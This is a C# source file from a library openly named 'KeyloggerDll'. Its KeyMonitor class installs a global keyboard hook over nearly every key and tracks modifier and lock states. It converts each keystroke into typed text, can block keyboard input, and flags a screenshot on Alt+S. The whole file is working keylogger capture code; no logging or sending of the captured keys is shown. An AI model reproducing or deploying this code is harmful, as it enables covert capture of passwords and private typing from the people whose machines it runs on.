using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace KeyloggerDll
{
    public class KeyMonitor
    {
        Utilities gkh;
        public KeyMonitor()
        {
             
        }

        public void Start()
        {
            gkh = new Utilities();
            add_keys_to_the_list();
            gkh.KeyDown += gkh_KeyDown;
            gkh.Keyup += gkh_KeyUp;
        }

        public void Stop()
        {
            //gkh.Dispose();
            gkh = null;
        }




        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vkey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyStatr(int vKey);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hwnd, string lpString, int cch);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowThreadProcessId(IntPtr hwnd, out int lpdwProcessId);
        [DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hwnd);
        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        public struct KeyStates
        {
            public bool CapsLock;
            public bool NumLock;
            public bool ScrollLock;
            public bool isShiftKeyOn;
            public bool isCtrlKeyOn;
            public bool isAltKeykOn;
           
            public Keys PressedKey;
            public KeyAction keyaction;

        }
        public struct keyAction
        {
            public bool TakeScreenShot;
        }

        public enum KeyAction
        {
            Down,
            Up,
        }

        public KeyStates keystate;
        public keyAction keyaction;
        /// <summary>
        /// sender is KeyStates
        /// </summary>
        // public event EventHandler KeyDownUp;
        public event EventHandler keyIsUp;
        public event EventHandler KeyIsDown;
        /// <summary>
        /// Set true to handle the keys
        /// </summary>
        public bool HandleKeyStroke = false;

        /// <summary>
        /// Adding the Keys to the list of detectable keys
        /// the list is in another class called Utilities 
        ///  "gkh" is the object of the Utilites Class and  HookedKeys is the list in the Utilities Class
        /// </summary>
        ///
        private void add_keys_to_the_list()
        {
            this.gkh.HookedKeys.Add(Keys.A);
            this.gkh.HookedKeys.Add(Keys.Add);
            this.gkh.HookedKeys.Add(Keys.Alt);
            this.gkh.HookedKeys.Add(Keys.Apps);
            this.gkh.HookedKeys.Add(Keys.Attn);

            this.gkh.HookedKeys.Add(Keys.B);
            this.gkh.HookedKeys.Add(Keys.Back);
            this.gkh.HookedKeys.Add(Keys.BrowserBack);
            this.gkh.HookedKeys.Add(Keys.BrowserFavorites);
            this.gkh.HookedKeys.Add(Keys.BrowserForward);
            this.gkh.HookedKeys.Add(Keys.BrowserHome);
            this.gkh.HookedKeys.Add(Keys.BrowserRefresh);
            this.gkh.HookedKeys.Add(Keys.BrowserSearch);
            this.gkh.HookedKeys.Add(Keys.BrowserStop);

            this.gkh.HookedKeys.Add(Keys.C);
            this.gkh.HookedKeys.Add(Keys.Cancel);
            this.gkh.HookedKeys.Add(Keys.Capital);
            this.gkh.HookedKeys.Add(Keys.CapsLock);
            this.gkh.HookedKeys.Add(Keys.Clear);
            this.gkh.HookedKeys.Add(Keys.Control);
            this.gkh.HookedKeys.Add(Keys.ControlKey);
            this.gkh.HookedKeys.Add(Keys.Crsel);

            this.gkh.HookedKeys.Add(Keys.D);
            this.gkh.HookedKeys.Add(Keys.D0);
            this.gkh.HookedKeys.Add(Keys.D1);
            this.gkh.HookedKeys.Add(Keys.D2);
            this.gkh.HookedKeys.Add(Keys.D3);
            this.gkh.HookedKeys.Add(Keys.D4);
            this.gkh.HookedKeys.Add(Keys.D5);
            this.gkh.HookedKeys.Add(Keys.D6);
            this.gkh.HookedKeys.Add(Keys.D7);
            this.gkh.HookedKeys.Add(Keys.D8);
            this.gkh.HookedKeys.Add(Keys.D9);
            this.gkh.HookedKeys.Add(Keys.Decimal);
            this.gkh.HookedKeys.Add(Keys.Delete);
            this.gkh.HookedKeys.Add(Keys.Divide);
            this.gkh.HookedKeys.Add(Keys.Down);

            this.gkh.HookedKeys.Add(Keys.E);
            this.gkh.HookedKeys.Add(Keys.End);
            this.gkh.HookedKeys.Add(Keys.Enter);
            this.gkh.HookedKeys.Add(Keys.EraseEof);
            this.gkh.HookedKeys.Add(Keys.Escape);
            this.gkh.HookedKeys.Add(Keys.Execute);
            this.gkh.HookedKeys.Add(Keys.Exsel);


            this.gkh.HookedKeys.Add(Keys.F);
            this.gkh.HookedKeys.Add(Keys.F1);
            this.gkh.HookedKeys.Add(Keys.F10);
            this.gkh.HookedKeys.Add(Keys.F11);
            this.gkh.HookedKeys.Add(Keys.F12);
            this.gkh.HookedKeys.Add(Keys.F13);
            this.gkh.HookedKeys.Add(Keys.F14);
            this.gkh.HookedKeys.Add(Keys.F15);
            this.gkh.HookedKeys.Add(Keys.F16);
            this.gkh.HookedKeys.Add(Keys.F17);
            this.gkh.HookedKeys.Add(Keys.F18);
            this.gkh.HookedKeys.Add(Keys.F19);
            this.gkh.HookedKeys.Add(Keys.F2);
            this.gkh.HookedKeys.Add(Keys.F20);
            this.gkh.HookedKeys.Add(Keys.F21);
            this.gkh.HookedKeys.Add(Keys.F22);
            this.gkh.HookedKeys.Add(Keys.F23);
            this.gkh.HookedKeys.Add(Keys.F24);
            this.gkh.HookedKeys.Add(Keys.F3);
            this.gkh.HookedKeys.Add(Keys.F4);
            this.gkh.HookedKeys.Add(Keys.F5);
            this.gkh.HookedKeys.Add(Keys.F6);
            this.gkh.HookedKeys.Add(Keys.F7);
            this.gkh.HookedKeys.Add(Keys.F8);
            this.gkh.HookedKeys.Add(Keys.F9);
            this.gkh.HookedKeys.Add(Keys.FinalMode);

            this.gkh.HookedKeys.Add(Keys.G);

            this.gkh.HookedKeys.Add(Keys.H);
            this.gkh.HookedKeys.Add(Keys.HanguelMode);
            this.gkh.HookedKeys.Add(Keys.HangulMode);
            this.gkh.HookedKeys.Add(Keys.HanjaMode);
            this.gkh.HookedKeys.Add(Keys.Help);
            this.gkh.HookedKeys.Add(Keys.Home);

            this.gkh.HookedKeys.Add(Keys.I);
            this.gkh.HookedKeys.Add(Keys.IMEAccept);
            this.gkh.HookedKeys.Add(Keys.IMEAceept);
            this.gkh.HookedKeys.Add(Keys.IMEConvert);
            this.gkh.HookedKeys.Add(Keys.IMEModeChange);
            this.gkh.HookedKeys.Add(Keys.IMENonconvert);
            this.gkh.HookedKeys.Add(Keys.Insert);

            this.gkh.HookedKeys.Add(Keys.J);
            this.gkh.HookedKeys.Add(Keys.JunjaMode);

            this.gkh.HookedKeys.Add(Keys.K);
            this.gkh.HookedKeys.Add(Keys.KanaMode);
            this.gkh.HookedKeys.Add(Keys.KanjiMode);
            this.gkh.HookedKeys.Add(Keys.KeyCode);

            this.gkh.HookedKeys.Add(Keys.L);
            this.gkh.HookedKeys.Add(Keys.LaunchApplication1);
            this.gkh.HookedKeys.Add(Keys.LaunchApplication2);
            this.gkh.HookedKeys.Add(Keys.LaunchMail);
            this.gkh.HookedKeys.Add(Keys.LButton);
            this.gkh.HookedKeys.Add(Keys.LControlKey);
            this.gkh.HookedKeys.Add(Keys.Left);
            this.gkh.HookedKeys.Add(Keys.LineFeed);
            this.gkh.HookedKeys.Add(Keys.LMenu);
            this.gkh.HookedKeys.Add(Keys.LShiftKey);
            this.gkh.HookedKeys.Add(Keys.LWin);

            this.gkh.HookedKeys.Add(Keys.M);
            this.gkh.HookedKeys.Add(Keys.MButton);
            this.gkh.HookedKeys.Add(Keys.MediaNextTrack);
            this.gkh.HookedKeys.Add(Keys.MediaPreviousTrack);
            this.gkh.HookedKeys.Add(Keys.MediaPlayPause);
            this.gkh.HookedKeys.Add(Keys.MediaStop);
            this.gkh.HookedKeys.Add(Keys.Menu);
            this.gkh.HookedKeys.Add(Keys.Modifiers);
            this.gkh.HookedKeys.Add(Keys.Multiply);

            this.gkh.HookedKeys.Add(Keys.N);
            this.gkh.HookedKeys.Add(Keys.Next);
            this.gkh.HookedKeys.Add(Keys.NoName);
            this.gkh.HookedKeys.Add(Keys.None);
            this.gkh.HookedKeys.Add(Keys.NumLock);
            this.gkh.HookedKeys.Add(Keys.NumPad0);
            this.gkh.HookedKeys.Add(Keys.NumPad1);
            this.gkh.HookedKeys.Add(Keys.NumPad2);
            this.gkh.HookedKeys.Add(Keys.NumPad3);
            this.gkh.HookedKeys.Add(Keys.NumPad4);
            this.gkh.HookedKeys.Add(Keys.NumPad5);
            this.gkh.HookedKeys.Add(Keys.NumPad6);
            this.gkh.HookedKeys.Add(Keys.NumPad7);
            this.gkh.HookedKeys.Add(Keys.NumPad8);
            this.gkh.HookedKeys.Add(Keys.NumPad9);

            this.gkh.HookedKeys.Add(Keys.O);
            this.gkh.HookedKeys.Add(Keys.Oem1);
            this.gkh.HookedKeys.Add(Keys.Oem102);
            this.gkh.HookedKeys.Add(Keys.Oem2);
            this.gkh.HookedKeys.Add(Keys.Oem3);
            this.gkh.HookedKeys.Add(Keys.Oem4);
            this.gkh.HookedKeys.Add(Keys.Oem5);
            this.gkh.HookedKeys.Add(Keys.Oem6);
            this.gkh.HookedKeys.Add(Keys.Oem7);
            this.gkh.HookedKeys.Add(Keys.Oem8);
            this.gkh.HookedKeys.Add(Keys.OemBackslash);
            this.gkh.HookedKeys.Add(Keys.OemClear);
            this.gkh.HookedKeys.Add(Keys.OemCloseBrackets);
            this.gkh.HookedKeys.Add(Keys.Oemcomma);
            this.gkh.HookedKeys.Add(Keys.OemMinus);
            this.gkh.HookedKeys.Add(Keys.OemOpenBrackets);
            this.gkh.HookedKeys.Add(Keys.OemPeriod);
            this.gkh.HookedKeys.Add(Keys.OemPipe);
            this.gkh.HookedKeys.Add(Keys.Oemplus);
            this.gkh.HookedKeys.Add(Keys.OemQuestion);
            this.gkh.HookedKeys.Add(Keys.OemQuotes);
            this.gkh.HookedKeys.Add(Keys.OemSemicolon);
            this.gkh.HookedKeys.Add(Keys.Oemtilde);

            this.gkh.HookedKeys.Add(Keys.P);
            this.gkh.HookedKeys.Add(Keys.Pa1);
            this.gkh.HookedKeys.Add(Keys.Packet);
            this.gkh.HookedKeys.Add(Keys.PageDown);
            this.gkh.HookedKeys.Add(Keys.PageUp);
            this.gkh.HookedKeys.Add(Keys.Pause);
            this.gkh.HookedKeys.Add(Keys.Play);
            this.gkh.HookedKeys.Add(Keys.Print);
            this.gkh.HookedKeys.Add(Keys.PrintScreen);
            this.gkh.HookedKeys.Add(Keys.Prior);
            this.gkh.HookedKeys.Add(Keys.ProcessKey);

            this.gkh.HookedKeys.Add(Keys.Q);

            this.gkh.HookedKeys.Add(Keys.R);
            this.gkh.HookedKeys.Add(Keys.RButton);
            this.gkh.HookedKeys.Add(Keys.RControlKey);
            this.gkh.HookedKeys.Add(Keys.Return);
            this.gkh.HookedKeys.Add(Keys.Right);
            this.gkh.HookedKeys.Add(Keys.RMenu);
            this.gkh.HookedKeys.Add(Keys.RShiftKey);
            this.gkh.HookedKeys.Add(Keys.RWin);

            this.gkh.HookedKeys.Add(Keys.S);
            this.gkh.HookedKeys.Add(Keys.Scroll);
            this.gkh.HookedKeys.Add(Keys.Select);
            this.gkh.HookedKeys.Add(Keys.SelectMedia);
            this.gkh.HookedKeys.Add(Keys.Separator);
            this.gkh.HookedKeys.Add(Keys.Shift);
            this.gkh.HookedKeys.Add(Keys.ShiftKey);
            this.gkh.HookedKeys.Add(Keys.Sleep);
            this.gkh.HookedKeys.Add(Keys.Snapshot);
            this.gkh.HookedKeys.Add(Keys.Space);
            this.gkh.HookedKeys.Add(Keys.Subtract);

            this.gkh.HookedKeys.Add(Keys.T);
            this.gkh.HookedKeys.Add(Keys.Tab);

            this.gkh.HookedKeys.Add(Keys.U);
            this.gkh.HookedKeys.Add(Keys.Up);

            this.gkh.HookedKeys.Add(Keys.V);
            this.gkh.HookedKeys.Add(Keys.VolumeDown);
            this.gkh.HookedKeys.Add(Keys.VolumeMute);
            this.gkh.HookedKeys.Add(Keys.VolumeUp);

            this.gkh.HookedKeys.Add(Keys.W);

            this.gkh.HookedKeys.Add(Keys.X);
            this.gkh.HookedKeys.Add(Keys.XButton1);
            this.gkh.HookedKeys.Add(Keys.XButton2);

            this.gkh.HookedKeys.Add(Keys.Y);

            this.gkh.HookedKeys.Add(Keys.Z);
            this.gkh.HookedKeys.Add(Keys.Zoom);


        }
        /// <summary>
        /// global keyup event function
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            
           
            keystate.CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
            keystate.NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
            keystate.ScrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;
            
            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
            {
                keystate.isShiftKeyOn = false;
            }
            if (e.KeyCode == Keys.RControlKey || e.KeyCode == Keys.LControlKey)
            {
                keystate.isCtrlKeyOn = false;
            }
            if (e.KeyCode == Keys.RMenu || e.KeyCode == Keys.LMenu)
            {
                keystate.isAltKeykOn = false;
                keyaction.TakeScreenShot = false;
            }
           
            e.Handled = false;
            keystate.PressedKey = e.KeyCode;
            //    KeyDownUp(keystate, EventArgs.Empty);
            keyIsUp(keystate , EventArgs.Empty);
            

        }
        /// <summary>
        /// global keydown event function
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void gkh_KeyDown(object sender, KeyEventArgs e)
        {


            keystate.CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

            keystate.NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;

            keystate.ScrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;
            if (HandleKeyStroke == false)
            {
                e.Handled = false;                            ///unlock keyboard
            }
            else
            {
                e.Handled = true;                   ///lock keyboard 

            }
            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
            {
                keystate.isShiftKeyOn = true;
            }
            if (e.KeyCode == Keys.RControlKey || e.KeyCode == Keys.LControlKey)
            {
                keystate.isCtrlKeyOn = true;
            }
            if (e.KeyCode == Keys.RMenu || e.KeyCode == Keys.LMenu)
            {
                keystate.isAltKeykOn = true;
            }
            if (keystate.isAltKeykOn && e.KeyCode == Keys.S)
            {
                keyaction.TakeScreenShot = true;
            }



            keystate.PressedKey = e.KeyCode;
            // KeyDownUp(keystate, EventArgs.Empty);
            KeyIsDown(keystate , EventArgs.Empty);


        }
        /// <summary>
        /// use this to get cuurently pressed key
        /// </summary>
        /// <returns>Return the string associated with pressed key</returns>
        public string GetPressedKey()
        {

            Keys pressedkey = keystate.PressedKey;

            
            if (pressedkey == Keys.Enter || pressedkey == Keys.Return)
            {
                return "\n";

            }
            
            
            else if (pressedkey == Keys.Space)
            {
                return " ";
            }
            else if (pressedkey == Keys.Tab)
            {
                return "\t";
            }


            else if (pressedkey == Keys.NumPad0)
            {
                return "0";
            }

            else if (pressedkey == Keys.NumPad1)
            {
                return "1";
            }
            else if (pressedkey == Keys.NumPad2)
            {
                return "2";
            }
            else if (pressedkey == Keys.NumPad3)
            {
                return "3";
            }
            else if (pressedkey == Keys.NumPad4)
            {
                return "4";
            }
            else if (pressedkey == Keys.NumPad5)
            {
                return "5";
            }
            else if (pressedkey == Keys.NumPad6)
            {
                return "6";
            }
            else if (pressedkey == Keys.NumPad7)
            {
                return "7";
            }
            else if (pressedkey == Keys.NumPad8)
            {
                return "8";
            }
            else if (pressedkey == Keys.NumPad9)
            {
                return "9";
            }
          
            


            if (pressedkey >= Keys.A && pressedkey <= Keys.Z)
            {
                string key = pressedkey.ToString(); 
                if ((keystate.isShiftKeyOn == false && keystate.CapsLock == false) || (keystate.isShiftKeyOn == true && keystate.CapsLock == true))            //if shift is off and caps is off
                {
                    return key.ToLower();
                }
                else if ((keystate.isShiftKeyOn == true && keystate.CapsLock == false) || (keystate.isShiftKeyOn == false && keystate.CapsLock == true))           ///if shift is on and caps is off
                {
                    return key.ToUpper();
                }

            }


            if (keystate.isShiftKeyOn == true)
            {
                if (pressedkey == Keys.Oem1)
                    return ":";

                else if (pressedkey == Keys.D0)
                    return ")";

                else if (pressedkey == Keys.D1)
                    return "!";

                else if (pressedkey == Keys.D2)
                    return "@";
                else if (pressedkey == Keys.D3)
                    return "#";
                else if (pressedkey == Keys.D4)
                    return "$";
                else if (pressedkey == Keys.D5)
                    return "%";
                else if (pressedkey == Keys.D6)
                    return "^";
                else if (pressedkey == Keys.D7)
                    return "&";
                else if (pressedkey == Keys.D8)
                    return "*";
                else if (pressedkey == Keys.D9)
                    return "(";

                else if (pressedkey == Keys.Oemtilde)
                    return "~";
                else if (pressedkey == Keys.OemMinus)
                    return "_";
                else if (pressedkey == Keys.Oemplus)
                    return "+";
                else if (pressedkey == Keys.Oem5)
                    return "|";
                else if (pressedkey == Keys.OemOpenBrackets)
                    return "{";
                else if (pressedkey == Keys.Oem6)
                    return "}";
                else if (pressedkey == Keys.OemPeriod)
                    return ">";
                else if (pressedkey == Keys.Oemcomma)
                    return "<";
                else if (pressedkey == Keys.OemQuestion)
                    return "?";
                else if (pressedkey == Keys.OemBackslash)
                    return "?";
                else if (pressedkey == Keys.Oem7)
                    return "\"";
            }

            else
            {
                if (pressedkey == Keys.Oem1)
                    return ";";

                else if (pressedkey == Keys.D0)
                    return "0";

                else if (pressedkey == Keys.D1)
                    return "1";

                else if (pressedkey == Keys.D2)
                    return "2";
                else if (pressedkey == Keys.D3)
                    return "3";
                else if (pressedkey == Keys.D4)
                    return "4";
                else if (pressedkey == Keys.D5)
                    return "5";
                else if (pressedkey == Keys.D6)
                    return "6";
                else if (pressedkey == Keys.D7)
                    return "7";
                else if (pressedkey == Keys.D8)
                    return "8";
                else if (pressedkey == Keys.D9)
                    return "9";

                else if (pressedkey == Keys.Oemtilde)
                    return "`";
                else if (pressedkey == Keys.OemMinus)
                    return "-";
                else if (pressedkey == Keys.Oemplus)
                    return "=";
                else if (pressedkey == Keys.Oem5)
                    return @"\";
                else if (pressedkey == Keys.OemOpenBrackets)
                    return "[";
                else if (pressedkey == Keys.Oem6)
                    return "]";
                else if (pressedkey == Keys.OemPeriod)
                    return ".";
                else if (pressedkey == Keys.Oemcomma)
                    return ",";
                else if (pressedkey == Keys.OemQuestion)
                    return "/";
                else if (pressedkey == Keys.Oem7)
                    return "'";

            }

            return "";

        }




    }
}
